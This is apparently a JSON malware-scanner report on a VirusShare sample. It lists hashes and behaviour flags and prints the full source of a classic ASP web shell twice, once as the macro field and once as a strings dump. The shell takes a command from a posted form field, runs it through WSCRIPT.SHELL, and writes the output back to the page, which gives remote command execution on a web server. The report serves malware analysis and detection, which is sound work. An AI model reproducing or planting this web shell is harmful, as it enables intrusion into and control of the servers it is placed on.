@@ -1,0 +1,75 @@
+{
+    "docinfo": {
+        "attributes": [],
+        "behavior": {
+            "Base64 Strings": "Base64-encoded str were detected, may be used to obfuscate str",
+            "Call": "May call a DLL using Excel 4 Macros",
+            "CreateObject": "May create an OLE object",
+            "Run": "May run an executable file or a system command",
+            "SHELL": "May run an executable file or a system command",
+            "WSCRIPT.SHELL": "May run an executable file or a system command",
+            "Write": "May write to a file",
+            "command": "May run PowerShell commands",
+            "output": "May write to a file"
+        },
+        "macro": " \n <%@ Language=VBScript %>\n <%\n\n   Dim oScript\n   Dim oScriptNet\n   Dim oFileSys, oFile\n   Dim szCMD, szTempFile\n \n   On Error Resume Next\n \n   ' -- create the COM objects that we will be using -- '\n   Set oScript = Server.CreateObject(\"WSCRIPT.SHELL\")\n   Set oScriptNet = Server.CreateObject(\"WSCRIPT.NETWORK\")\n   Set oFileSys = Server.CreateObject(\"Scripting.FileSystemObject\")\n \n   ' -- check for a command that we have posted -- '\n   szCMD = Request.Form(\".CMD\")\n   If (szCMD <> \"\") Then\n \n     ' -- Use a poor man's pipe ... a temp file -- '\n     szTempFile = \"C:\\\" & oFileSys.GetTempName( )\n     Call oScript.Run (\"command /c \" & szCMD & \" > \" & szTempFile, 0, True)\n     Set oFile = oFileSys.OpenTextFile (szTempFile, 1, False, 0)\n \n   End If\n \n %>\n <HTML>\n <BODY>\n <FORM action=\"<%= Request.ServerVariables(\"URL\") %>\" method=\"POST\">\n <input type=text name=\".CMD\" size=45 value=\"<%= szCMD %>\">\n <input type=submit value=\"Run\">\n </FORM>\n <PRE>\n\n <%\n   If (IsObject(oFile)) Then\n     ' -- Read the output from our command and remove the temp file -- '\n     On Error Resume Next\n     Response.Write Server.HTMLEncode(oFile.ReadAll)\n     oFile.Close\n    Call oFileSys.DeleteFile(szTempFile, True)\n  End If\n%>\n</BODY>\n</HTML>"
+    },
+    "filename": "VirusShare_3c494143bdf51191603c9c612cee7ec0",
+    "filesize": 1276,
+    "filetype": "HTML document, ASCII text, with CRLF line terminators",
+    "hashes": {
+        "md5": "3c494143bdf51191603c9c612cee7ec0",
+        "sha1": "44f893a566985eec7f0e61df702aba24b5557f4d",
+        "sha256": "7b1c42cbb2712615889e1907bb7179178485cdc740b8ec66e687dfe818ec4767"
+    },
+    "peinfo": {},
+    "strings": {
+        "dump": [
+            " <%@ Language=VBScript %>",
+            "   Dim oScript",
+            "   Dim oScriptNet",
+            "   Dim oFileSys, oFile",
+            "   Dim szCMD, szTempFile",
+            "   On Error Resume Next",
+            "   ' -- create the COM objects that we will be using -- '",
+            "   Set oScript = Server.CreateObject(\"WSCRIPT.SHELL\")",
+            "   Set oScriptNet = Server.CreateObject(\"WSCRIPT.NETWORK\")",
+            "   Set oFileSys = Server.CreateObject(\"Scripting.FileSystemObject\")",
+            "   ' -- check for a command that we have posted -- '",
+            "   szCMD = Request.Form(\".CMD\")",
+            "   If (szCMD <> \"\") Then",
+            "     ' -- Use a poor man's pipe ... a temp file -- '",
+            "     szTempFile = \"C:\\\" & oFileSys.GetTempName( )",
+            "     Call oScript.Run (\"command /c \" & szCMD & \" > \" & szTempFile, 0, True)",
+            "     Set oFile = oFileSys.OpenTextFile (szTempFile, 1, False, 0)",
+            "   End If",
+            " <HTML>",
+            " <BODY>",
+            " <FORM action=\"<%= Request.ServerVariables(\"URL\") %>\" method=\"POST\">",
+            " <input type=text name=\".CMD\" size=45 value=\"<%= szCMD %>\">",
+            " <input type=submit value=\"Run\">",
+            " </FORM>",
+            " <PRE>",
+            "   If (IsObject(oFile)) Then",
+            "     ' -- Read the output from our command and remove the temp file -- '",
+            "     On Error Resume Next",
+            "     Response.Write Server.HTMLEncode(oFile.ReadAll)",
+            "     oFile.Close",
+            "    Call oFileSys.DeleteFile(szTempFile, True)",
+            "  End If",
+            "</BODY>",
+            "</HTML>"
+        ],
+        "file": {},
+        "fuzzing": {},
+        "ip": [],
+        "url": []
+    },
+    "time": "0:00:00.261290",
+    "version": "6.0.3",
+    "virustotal": {
+        "positives": "",
+        "total": ""
+    },
+    "yara_plugins": []
+}
